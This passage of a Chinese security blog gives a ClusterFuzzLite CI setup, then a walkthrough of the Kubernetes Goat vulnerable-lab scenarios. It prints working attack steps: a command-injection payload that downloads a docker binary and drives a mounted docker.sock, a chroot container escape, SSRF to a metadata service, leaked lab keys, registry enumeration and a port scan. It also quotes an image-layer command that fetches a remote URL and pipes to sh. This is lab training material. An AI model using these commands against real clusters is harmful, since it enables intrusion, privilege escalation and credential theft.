language you are fuzzing. github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125; sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125; # Optional but recommended: used to only run fuzzers that are affected # by the PR. # See later section on &quot;Git repo for storage&quot;. # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git # storage-repo-branch: main # Optional. Defaults to &quot;main&quot; # storage-repo-branch-coverage: gh-pages # Optional. Defaults to &quot;gh-pages&quot;. - name: Run Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;) id: run uses: google/clusterfuzzlite/actions/run_fuzzers@v1 with: github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125; fuzz-seconds: 600 mode: &apos;code-change&apos; sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125; # Optional but recommended: used to download the corpus produced by # batch fuzzing. # See later section on &quot;Git repo for storage&quot;. # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git # storage-repo-branch: main # Optional. Defaults to &quot;main&quot; # storage-repo-branch-coverage: gh-pages # Optional. Defaults to &quot;gh-pages&quot;. 字段解析： language： 更改为目标代码的语言sanitizers： 更改或启用更多消毒剂。fuzz-seconds： 更改模糊测试的时间。parallel-fuzzing：使用并行模糊测试。 接下是.github/workflows/cflite_batch.yml 123456789101112131415161718192021222324252627282930313233343536name: ClusterFuzzLite batch fuzzingon: schedule: - cron: &apos;0 0/6 * * *&apos; # Every 6th hour. Change this to whatever is suitable.permissions: read-alljobs: BatchFuzzing: runs-on: ubuntu-latest strategy: fail-fast: false matrix: sanitizer: - address # Override this with the sanitizers you want. # - undefined # - memory steps: - name: Build Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;) id: build uses: google/clusterfuzzlite/actions/build_fuzzers@v1 with: language: c++ # Change this to the language you are fuzzing. sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125; - name: Run Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;) id: run uses: google/clusterfuzzlite/actions/run_fuzzers@v1 with: github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125; fuzz-seconds: 3600 mode: &apos;batch&apos; sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125; # Optional but recommended: For storing certain artifacts from fuzzing. # See later section on &quot;Git repo for storage&quot;. # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git # storage-repo-branch: main # Optional. Defaults to &quot;main&quot; # storage-repo-branch-coverage: gh-pages # Optional. Defaults to &quot;gh-pages&quot;. .github/workflows/cflite_build.yml 12345678910111213141516171819202122232425262728name: ClusterFuzzLite continuous buildson: push: branches: - main # Use your actual default branch here.permissions: read-alljobs: Build: runs-on: ubuntu-latest concurrency: group: $&#123;&#123; github.workflow &#125;&#125;-$&#123;&#123; matrix.sanitizer &#125;&#125;-$&#123;&#123; github.ref &#125;&#125; cancel-in-progress: true strategy: fail-fast: false matrix: sanitizer: - address # Override this with the sanitizers you want. # - undefined # - memory steps: - name: Build Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;) id: build uses: google/clusterfuzzlite/actions/build_fuzzers@v1 with: language: c++ # Change this to the language you are fuzzing. sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125; upload-build: true .github/workflows/cflite_cron.yml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748name: ClusterFuzzLite cron taskson: schedule: - cron: &apos;0 0 * * *&apos; # Once a day at midnight.permissions: read-alljobs: Pruning: runs-on: ubuntu-latest steps: - name: Build Fuzzers id: build uses: google/clusterfuzzlite/actions/build_fuzzers@v1 with: language: c++ # Change this to the language you are fuzzing - name: Run Fuzzers id: run uses: google/clusterfuzzlite/actions/run_fuzzers@v1 with: github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125; fuzz-seconds: 600 mode: &apos;prune&apos; # Optional but recommended. # See later section on &quot;Git repo for storage&quot;. # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git # storage-repo-branch: main # Optional. Defaults to &quot;main&quot; # storage-repo-branch-coverage: gh-pages # Optional. Defaults to &quot;gh-pages&quot;. Coverage: runs-on: ubuntu-latest steps: - name: Build Fuzzers id: build uses: google/clusterfuzzlite/actions/build_fuzzers@v1 with: language: c++ # Change this to the language you are fuzzing. sanitizer: coverage - name: Run Fuzzers id: run uses: google/clusterfuzzlite/actions/run_fuzzers@v1 with: github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125; fuzz-seconds: 600 mode: &apos;coverage&apos; sanitizer: &apos;coverage&apos; # Optional but recommended. # See later section on &quot;Git repo for storage&quot;. # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git # storage-repo-branch: main # Optional. Defaults to &quot;main&quot; # storage-repo-branch-coverage: gh-pages # Optional. Defaults to &quot;gh-pages&quot;. 之后将代码都提交github，之后在Actions那里可以看到Workflow 此外谷歌官方人员也有个curl示例 1https://github.com/oliverchang/curl/ 参考https://google.github.io/clusterfuzzlite/","categories":[],"tags":[{"name":"clusterfuzzlite","slug":"clusterfuzzlite","permalink":"https://www.giantbranch.cn/tags/clusterfuzzlite/"},{"name":"ci-fuzz","slug":"ci-fuzz","permalink":"https://www.giantbranch.cn/tags/ci-fuzz/"}]},{"title":"Kubernetes Goat：Kubernetes 漏洞靶场","slug":"Kubernetes Goat：Kubernetes 漏洞靶场","date":"2022-06-13T00:00:00.000Z","updated":"2023-10-13T13:38:33.762Z","comments":true,"path":"2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/","link":"","permalink":"https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/","excerpt":"","text":"代码中的敏感keys(Sensitive keys in codebases)网站文字写着（翻译后如下）： 欢迎使用构建代码服务。 该服务是使用具有 CI/CD 管道和现代工具集（如 Git、Docker、AWS 等）的容器构建的。 给的是一个web，就是代码泄露，里面包含了Sensitive keys 可以通过目录爆破工具dirsearch进行目录爆破，确认是git泄露，再用相应工具泄露 通过git-dumper下载源码 有一个提交，环境变量比较敏感 切换过去 12345678910111213$ git checkout d7c173ad183c574109cd5c4c648ffe551755b576Note: checking out &apos;d7c173ad183c574109cd5c4c648ffe551755b576&apos;.You are in &apos;detached HEAD&apos; state. You can look around, make experimentalchanges and commit them, and you can discard any commits you make in thisstate without impacting any branches by performing another checkout.If you want to create a new branch to retain commits you create, you maydo so (now or later) by using -b with the checkout command again. Example: git checkout -b &lt;new-branch-name&gt;HEAD is now at d7c173a... Inlcuded custom environmental variables 跟原来比，多了一个隐藏文件.env，一看是aws的一些key 1234567$ ls -a. .. .env .git go.mod go.sum main.go README.md$ cat .env[build-code-aws]aws_access_key_id = AKIVSHD6243H22G1KIDCaws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1Mk8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc 进入pod中 12export POD_NAME=$(kubectl get pods --namespace default -l &quot;app=build-code&quot; -o jsonpath=&quot;&#123;.items[0].metadata.name&#125;&quot;)kubectl exec -it $POD_NAME -- sh 执行trufflehog .来分析 123456789101112131415161718192021222324252627282930313233/app # trufflehog .~~~~~~~~~~~~~~~~~~~~~Reason: High EntropyDate: 2020-11-06 22:39:53Hash: 7daa5f4cda812faa9c62966ba57ee9047ee6b577Filepath: .envBranch: origin/masterCommit: updated the endpoints and routes@@ -0,0 +1,5 @@+[build-code-aws]+aws_access_key_id = AKIVSHD6243H22G1KIDC+aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M+k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Reason: High EntropyDate: 2020-11-06 22:39:53Hash: 7daa5f4cda812faa9c62966ba57ee9047ee6b577Filepath: go.sumBranch: origin/masterCommit: updated the endpoints and routes@@ -1,496 +1,25 @@-cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=.................................... 这个工具可通过pip安装 1pip install trufflehog DIND (docker-in-docker) exploitation这个就是命令注入，之后看到把docker.sock映射到里面了 /var/run/docker.sock是Docker守护进程(Docker daemon)默认监听的Unix域套接字(Unix domain socket)，假如被映射到容器内，那么我们就可以跟Docker daemon进行通信，从而执行一些命令 可以通过下载docker静态二进制文件进行利用，下面是查看主机上面有什么镜像 1127.0.0.1;wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz -O /tmp/docker-19.03.9.tgz &amp;&amp; tar -xvzf /tmp/docker-19.03.9.tgz -C /tmp/ ;/tmp/docker/docker -H unix:///custom/docker/docker.sock images 假如利用的话就是拉取指定的后门镜像并运行，运行过程中镜像将宿主机的根目录/挂载到容器内部的/host目录下，便于通过后门容器修改宿主机本地文件(如crontab)来完成逃逸。 在配置文件中也能看到目录映射 Kubernetes (K8S) 中的 SSRF这是一个内部API代理，5000端口 看到有个metadata-db的东东 不断深入，发现http://metadata-db/latest/secrets/kubernetes-goat 解码一下 12echo &quot;azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=&quot; | base64 -dk8s-goat-ca90ef85db7a5aef0198d02fb0df9cab 容器逃逸(Container escape to the host system)为了适应更复杂的权限需求，从 2.2 版本起 Linux 内核能够进一步将超级用户的权限分解为细颗粒度的单元，这些单元称为 capabilities。例如，capability CAP_CHOWN 允许用户对文件的 UID 和 GID 进行任意修改，即执行 chown 命令。几乎所有与超级用户相关的特权都被分解成了单独的 capability。 在docker中可以使用capsh --print输出各种capability权限 12345678910root@nsfocus:/# capsh --printCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+epBounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_readSecurebits: 00/0x0/1&apos;b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups= 通过跟正常的机器输出的权限进行对比，基本没什么差别，这是具有所有权限的root 通过mount命令可以看到挂载了一个/host-system目录 通过df命令也可以看到，只不过我们不确定这是不是挂载的 看名字应该是宿主机目录的，我们ls一下，这看着是整个宿主机的根目录都映射进来了 123root@nsfocus:~# ls /host-system/bin boot cdrom dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin snap srv swap.img sys tmp usr varroot@nsfocus:~# 通过chroot命令，我们可以获取宿主机的执行权限 123456789101112131415161718root@nsfocus:~# chroot /host-system/ bashroot@nsfocus:/# lsbin boot cdrom dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin snap srv swap.img sys tmp usr varroot@nsfocus:/# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESf0a9afd6f2b6 madhuakula/k8s-goat-info-app &quot;python /app.py&quot; 3 days ago Up 3 days k8s_info-app_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0628fcee2fd49 madhuakula/k8s-goat-internal-api &quot;docker-entrypoint.s…&quot; 4 days ago Up 4 days k8s_internal-api_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0df0495417aa4 registry.aliyuncs.com/google_containers/pause:3.4.1 &quot;/pause&quot; 4 days ago Up 4 days k8s_POD_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_05702cc4cdd60 madhuakula/k8s-goat-system-monitor &quot;gotty -w bash&quot; 4 days ago Up 4 days k8s_system-monitor_system-monitor-deployment-594c89b48f-97rs9_default_081f809d-8199-44bd-8f86-ac6942df3dc8_09c1ca7ec8f1a madhuakula/k8s-goat-poor-registry &quot;/entrypoint.sh regi…&quot; 4 days ago Up 4 days k8s_poor-registry_poor-registry-deployment-6746b95974-j9xrw_default_d4820b3b-48f0-4ebb-9657-c24d677c73cb_0c8993f38a99d madhuakula/k8s-goat-home &quot;/docker-entrypoint.…&quot; 4 days ago Up 4 days k8s_kubernetes-goat-home_kubernetes-goat-home-deployment-757f96b7cd-tq5zh_default_ef99f1cd-b0ff-4d6a-9a2e-6443acba79ee_04a7f97587378 madhuakula/k8s-goat-hidden-in-layers &quot;sh -c &apos;tail -f /dev…&quot; 4 days ago Up 4 days k8s_hidden-in-layers_hidden-in-layers-lbwbn_default_2ab7372a-e434-4cae-8ede-beca97d662ab_0.................................... 还可以通过kubectl控制，查看集群（这里需要指定配置文件） 123456789101112131415root@nsfocus:/# kubectl --kubeconfig /etc/kubernetes/kubelet.conf get podsNAME READY STATUS RESTARTS AGEbatch-check-job-mrd2q 0/1 Completed 0 4d4hbuild-code-deployment-99d5f65db-hxllz 1/1 Running 0 4d4hhealth-check-deployment-66c59d7f6f-qf5b7 1/1 Running 0 4d4hhidden-in-layers-lbwbn 1/1 Running 0 4d4hinternal-proxy-deployment-5d99cbbdf7-wqmgr 2/2 Running 0 3d23hkubernetes-goat-home-deployment-757f96b7cd-tq5zh 1/1 Running 0 4d4hmetadata-db-77987b74b-2tqjr 1/1 Running 0 4d4hpoor-registry-deployment-6746b95974-j9xrw 1/1 Running 0 4d4hsystem-monitor-deployment-594c89b48f-97rs9 1/1 Running 0 4d4hroot@nsfocus:/# kubectl --kubeconfig /etc/kubernetes/kubelet.conf get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready control-plane,master 4d20h v1.21.13nsfocus Ready &lt;none&gt; 4d20h v1.21.13 我们查看一下部署的yaml文件，可以看到除了挂载根目录到/host-system，securityContext那里还有allowPrivilegeEscalation: true和privileged: true，这两个可是很危险的，跟docker的–privileged 12345678910111213141516171819202122232425262728293031323334353637root@k8s-master:~/kubernetes-goat/scenarios/system-monitor# cat deployment.yaml apiVersion: v1kind: Secretmetadata: name: goatvaulttype: Opaquedata: k8sgoatvaultkey: azhzLWdvYXQtY2QyZGEyNzIyNDU5MWRhMmI0OGVmODM4MjZhOGE2YzM=---apiVersion: apps/v1kind: Deployment..................volumes: - name: host-filesystem hostPath: path: / containers: - name: system-monitor image: madhuakula/k8s-goat-system-monitor resources: limits: memory: &quot;50Mi&quot; cpu: &quot;20m&quot; securityContext: allowPrivilegeEscalation: true privileged: true ports: - containerPort: 8080 volumeMounts: - name: host-filesystem mountPath: /host-system.................. Docker CIS 基准分析CIS即Center for Internet Security (CIS) 为安全基准计划提供了定义明确、公正、基于一致性的行业最佳实践来帮助组织评估和增强其安全性 Docker Bench for Security是一款脚本工具，用于检查围绕在生产环境中部署Docker容器的数十种常见最佳实践。github地址：https://github.com/docker/docker-bench-security 首先部署 Docker CIS 基准测试的容器 1kubectl apply -f scenarios/docker-bench-security/deployment.yaml 进入容器 1kubectl exec -it docker-bench-security-XXXXX -- sh 执行~/docker-bench-security中的docker-bench-security.sh即可执行检查 其实上面的scenarios/docker-bench-security/deployment.yaml是将一些宿主机目录映射到容器中，从而执行的检查。 所以我们也可以直接从github下载脚本到宿主机进行检查 Kubernetes CIS 基准分析上面是docker，这次是Kubernetes，github地址：https://github.com/aquasecurity/kube-bench 两个命令部署即可 123kubectl apply -f scenarios/kube-bench-security/node-job.yamlkubectl apply -f scenarios/kube-bench-security/master-job.yaml 查看yaml，两个执行的命令分别是command: [&quot;kube-bench&quot;, &quot;node&quot;]和command: [&quot;kube-bench&quot;, &quot;master&quot;] 不过我看github上的yaml的command已经有所改变 1234# https://github.com/aquasecurity/kube-bench/blob/main/job-master.yamlcommand: [&quot;kube-bench&quot;, &quot;run&quot;, &quot;--targets&quot;, &quot;master&quot;]# https://github.com/aquasecurity/kube-bench/blob/main/job-node.yamlcommand: [&quot;kube-bench&quot;, &quot;run&quot;, &quot;--targets&quot;, &quot;node&quot;] 执行后可以看到jobs多了一个kube-bench-node 1234567root@k8s-master:~/kubernetes-goat# kubectl apply -f scenarios/kube-bench-security/node-job.yamljob.batch/kube-bench-node createdroot@k8s-master:~/kubernetes-goat# kubectl get jobsNAME COMPLETIONS DURATION AGEbatch-check-job 1/1 36s 4d6hhidden-in-layers 0/1 4d6h 4d6hkube-bench-node 0/1 14s 14s 不过通过查看pod的状态是Error 12345678910111213141516171819root@k8s-master:~/kubernetes-goat# kubectl get podsNAME READY STATUS RESTARTS AGEbatch-check-job-mrd2q 0/1 Completed 0 4d6hbuild-code-deployment-99d5f65db-hxllz 1/1 Running 0 4d6hdocker-bench-security-dvlgz 1/1 Running 0 61mhealth-check-deployment-66c59d7f6f-qf5b7 1/1 Running 0 4d6hhidden-in-layers-lbwbn 1/1 Running 0 4d6hinternal-proxy-deployment-5d99cbbdf7-wqmgr 2/2 Running 0 4d1hkube-bench-node-44mxv 0/1 Error 0 12mkube-bench-node-8vf74 0/1 Error 0 10mkube-bench-node-lfnmt 0/1 Error 0 8m10skube-bench-node-nmfn8 0/1 Error 0 10mkube-bench-node-t67b8 0/1 Error 0 11mkube-bench-node-xnlvw 0/1 Error 0 5m30skube-bench-node-zb54v 0/1 Error 0 9m30skubernetes-goat-home-deployment-757f96b7cd-tq5zh 1/1 Running 0 4d6hmetadata-db-77987b74b-2tqjr 1/1 Running 0 4d6hpoor-registry-deployment-6746b95974-j9xrw 1/1 Running 0 4d6hsystem-monitor-deployment-594c89b48f-97rs9 1/1 Running 0 4d6h 后面修改command后再试 1234root@k8s-master:~/kubernetes-goat# kubectl delete -f ./scenarios/kube-bench-security/node-job.yaml job.batch &quot;kube-bench-node&quot; deletedroot@k8s-master:~/kubernetes-goat# kubectl apply -f ./scenarios/kube-bench-security/node-job.yaml job.batch/kube-bench-node created 便可以了，所以还是得用最新的配置文件 12345678910111213root@k8s-master:~/kubernetes-goat# kubectl get podsNAME READY STATUS RESTARTS AGEbatch-check-job-mrd2q 0/1 Completed 0 4d6hbuild-code-deployment-99d5f65db-hxllz 1/1 Running 0 4d6hdocker-bench-security-dvlgz 1/1 Running 0 63mhealth-check-deployment-66c59d7f6f-qf5b7 1/1 Running 0 4d6hhidden-in-layers-lbwbn 1/1 Running 0 4d6hinternal-proxy-deployment-5d99cbbdf7-wqmgr 2/2 Running 0 4d1hkube-bench-node-8xndd 0/1 Completed 0 68skubernetes-goat-home-deployment-757f96b7cd-tq5zh 1/1 Running 0 4d6hmetadata-db-77987b74b-2tqjr 1/1 Running 0 4d6hpoor-registry-deployment-6746b95974-j9xrw 1/1 Running 0 4d6hsystem-monitor-deployment-594c89b48f-97rs9 1/1 Running 0 4d6h 可以通过logs查看审计的log 1kubectl logs -f kube-bench-XXX-xxxxx 攻击私有仓库(Attacking private registry)通过访问/v2/_catalog可以获取所有repositories 12$ curl http://192.168.2.174:1235/v2/_catalog&#123;&quot;repositories&quot;:[&quot;madhuakula/k8s-goat-alpine&quot;,&quot;madhuakula/k8s-goat-users-repo&quot;]&#125; 获取第二个镜像的信息 12345678910111213141516171819$ curl http://192.168.2.174:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest&#123; &quot;schemaVersion&quot;: 1, &quot;name&quot;: &quot;madhuakula/k8s-goat-users-repo&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;architecture&quot;: &quot;amd64&quot;, &quot;fsLayers&quot;: [ &#123; &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot; &#125;, &#123; &quot;blobSum&quot;: &quot;sha256:536ef5475913f0235984eb7642226a99ff4a91fa474317faa45753e48e631bd0&quot; &#125;,.................................... 从中有环境变量信息 NodePort暴露服务NodePort在集群中的主机节点上为Service提供一个代理端口，以允许从主机网络上对Service进行访问。 这里是本地搭建的，没有公网ip，所以也就没有外部IP——EXTERNAL-IP 1234$ kubectl get nodes -o wideNAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIMEk8s-master Ready control-plane,master 4d23h v1.21.13 192.168.2.174 &lt;none&gt; Ubuntu 20.04.2 LTS 5.4.0-72-generic docker://20.10.16nsfocus Ready &lt;none&gt; 4d23h v1.21.13 192.168.2.172 &lt;none&gt; Ubuntu 20.04.2 LTS 5.4.0-72-generic docker://20.10.16 默认情况下，NodePort的端口范围是 30000-32767，使用nmap扫描，这里就以内网ip为例了 12345678910$ nmap -T4 -p 30000-32767 192.168.2.172Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-20 18:57 CSTNmap scan report for 192.168.2.172Host is up (0.0055s latency).Not shown: 2767 closed portsPORT STATE SERVICE30003/tcp open amicon-fpsu-raMAC Address: 00:50:56:A2:18:00 (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds 可以看到是30003端口 12$ curl http://192.168.2.172:30003/&#123;&quot;info&quot;: &quot;Refer to internal http://metadata-db for more information&quot;&#125; Helm v2 tiller to PwN the cluster[已弃用]这已经从 Kubernetes Goat 启弃用，但是还可以看一下 Helm 是 Kubernetes 部署和管理应用程序的包管理器，默认配置和设置是不安全的，如果攻击者可以访问任何一个 pod 并且没有网络安全策略 (NSP)，攻击者可以获得完整的集群访问权限和接管集群管理员权限。 启动环境 1kubectl run --rm --restart=Never -it --image=madhuakula/k8s-goat-helm-tiller -- bash 默认情况下，helm 版本 2 有一个 tiller 组件，它具有完整的集群管理 RBAC 权限 这个暂时有点问题，不能实践，就是默认不允许执行kubectl get secrets -n kube-system，通过 helm 和 tiller 服务的帮助下部署pwnchart，它将授予所有默认服务帐户 cluster-admin 访问权限，从而可以执行kubectl get secrets -n kube-system 分析挖矿容器(Analysing crypto miner container)一般我们从 Docker Hub 等公共容器仓库下载镜像，黑客可能通过上传运行挖矿程序的镜像到仓库来让用户帮忙挖矿。 先查看 Kubernetes 集群中的 jobs 12345$ kubectl get jobs -ANAMESPACE NAME COMPLETIONS DURATION AGEdefault batch-check-job 1/1 36s 5d5hdefault hidden-in-layers 0/1 5d5h 5d5hdefault kube-bench-node 1/1 29s 22h kube-bench-node是之前node的基线检查 获取job的信息 12345678910111213141516171819202122232425$ kubectl describe job batch-check-jobName: batch-check-jobNamespace: defaultSelector: controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7Labels: controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7 job-name=batch-check-jobAnnotations: &lt;none&gt;Parallelism: 1Completions: 1Start Time: Thu, 16 Jun 2022 10:53:35 +0800Completed At: Thu, 16 Jun 2022 10:54:11 +0800Duration: 36sPods Statuses: 0 Running / 1 Succeeded / 0 FailedPod Template: Labels: controller-uid=2ef52301-70c7-48f1-8df7-9319674f2ca7 job-name=batch-check-job Containers: batch-check: Image: madhuakula/k8s-goat-batch-check Port: &lt;none&gt; Host Port: &lt;none&gt; Environment: &lt;none&gt; Mounts: &lt;none&gt; Volumes: &lt;none&gt;Events: &lt;none&gt; 获取job对应的pods 123$ kubectl get pods --namespace default -l &quot;job-name=batch-check-job&quot;NAME READY STATUS RESTARTS AGEbatch-check-job-mrd2q 0/1 Completed 0 5d5h 以yaml格式输出pod的信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115$ kubectl get pod batch-check-job-mrd2q -o yamlapiVersion: v1kind: Podmetadata: creationTimestamp: &quot;2022-06-16T02:53:35Z&quot; generateName: batch-check-job- labels: controller-uid: 2ef52301-70c7-48f1-8df7-9319674f2ca7 job-name: batch-check-job name: batch-check-job-mrd2q namespace: default ownerReferences: - apiVersion: batch/v1 blockOwnerDeletion: true controller: true kind: Job name: batch-check-job uid: 2ef52301-70c7-48f1-8df7-9319674f2ca7 resourceVersion: &quot;72916&quot; uid: 27657ad4-4fa9-48d0-bdd8-c131137ac3d2spec: containers: - image: madhuakula/k8s-goat-batch-check imagePullPolicy: Always name: batch-check resources: &#123;&#125; terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /var/run/secrets/kubernetes.io/serviceaccount name: kube-api-access-pdfwk readOnly: true dnsPolicy: ClusterFirst enableServiceLinks: true nodeName: nsfocus preemptionPolicy: PreemptLowerPriority priority: 0 restartPolicy: Never schedulerName: default-scheduler securityContext: &#123;&#125; serviceAccount: default serviceAccountName: default terminationGracePeriodSeconds: 30 tolerations: - effect: NoExecute key: node.kubernetes.io/not-ready operator: Exists tolerationSeconds: 300 - effect: NoExecute key: node.kubernetes.io/unreachable operator: Exists tolerationSeconds: 300 volumes: - name: kube-api-access-pdfwk projected: defaultMode: 420 sources: - serviceAccountToken: expirationSeconds: 3607 path: token - configMap: items: - key: ca.crt path: ca.crt name: kube-root-ca.crt - downwardAPI: items: - fieldRef: apiVersion: v1 fieldPath: metadata.namespace path: namespacestatus: conditions: - lastProbeTime: null lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot; reason: PodCompleted status: &quot;True&quot; type: Initialized - lastProbeTime: null lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot; reason: PodCompleted status: &quot;False&quot; type: Ready - lastProbeTime: null lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot; reason: PodCompleted status: &quot;False&quot; type: ContainersReady - lastProbeTime: null lastTransitionTime: &quot;2022-06-16T02:53:35Z&quot; status: &quot;True&quot; type: PodScheduled containerStatuses: - containerID: docker://3c724beda2e350f66c3e1845535a2b62f03f3678070ac6d290c39ee7462feb1f image: madhuakula/k8s-goat-batch-check:latest imageID: docker-pullable://madhuakula/k8s-goat-batch-check@sha256:5be381d47c086a0b74bbcdefa5f3ba0ebb78c8acbd2c07005346b5ff687658ef lastState: &#123;&#125; name: batch-check ready: false restartCount: 0 started: false state: terminated: containerID: docker://3c724beda2e350f66c3e1845535a2b62f03f3678070ac6d290c39ee7462feb1f exitCode: 0 finishedAt: &quot;2022-06-16T02:54:11Z&quot; reason: Completed startedAt: &quot;2022-06-16T02:54:11Z&quot; hostIP: 192.168.2.172 phase: Succeeded podIP: 10.244.1.4 podIPs: - ip: 10.244.1.4 qosClass: BestEffort startTime: &quot;2022-06-16T02:53:35Z&quot; batch-check-job使用的是madhuakula/k8s-goat-batch-check镜像 12345$ kubectl get pod batch-check-job-mrd2q -o yaml | grep image - image: madhuakula/k8s-goat-batch-check imagePullPolicy: Always image: madhuakula/k8s-goat-batch-check:latest imageID: docker-pullable://madhuakula/k8s-goat-batch-check@sha256:5be381d47c086a0b74bbcdefa5f3ba0ebb78c8acbd2c07005346b5ff687658ef 我们可以通过docker history查看image每一层所执行的命令，--no-trunc是不要截断输出(下面这个需要在node执行，因为只有在node有这个镜像) 1234567$ docker history --no-trunc madhuakula/k8s-goat-batch-checkIMAGE CREATED CREATED BY SIZE COMMENTsha256:cb43bcb572b74468336c6854282c538e9ac7f2efc294aa3e49ce34fab7a275c7 5 weeks ago CMD [&quot;ps&quot; &quot;auxx&quot;] 0B buildkit.dockerfile.v0&lt;missing&gt; 5 weeks ago RUN /bin/sh -c apk add --no-cache htop curl ca-certificates &amp;&amp; echo &quot;curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo &apos;id&apos; | sh &quot; &gt; /usr/bin/system-startup &amp;&amp; chmod +x /usr/bin/system-startup &amp;&amp; rm -rf /tmp/* # buildkit 2.96MB buildkit.dockerfile.v0&lt;missing&gt; 5 weeks ago LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat 0B buildkit.dockerfile.v0&lt;missing&gt; 2 months ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot;] 0B &lt;missing&gt; 2 months ago /bin/sh -c #(nop) ADD file:5d673d25da3a14ce1f6cf66e4c7fd4f4b85a3759a9d93efb3fd9ff852b5b56e4 in / 5.57MB 可以看到执行了这个可疑的命令 1/bin/sh -c apk add --no-cache htop curl ca-certificates &amp;&amp; echo &quot;curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 &amp;&amp; echo &apos;id&apos; | sh &quot; &gt; /usr/bin/system-startup &amp;&amp; chmod +x /usr/bin/system-startup &amp;&amp; rm -rf /tmp/* Kubernetes 命名空间绕过(Kubernetes namespaces bypass) Kubernetes 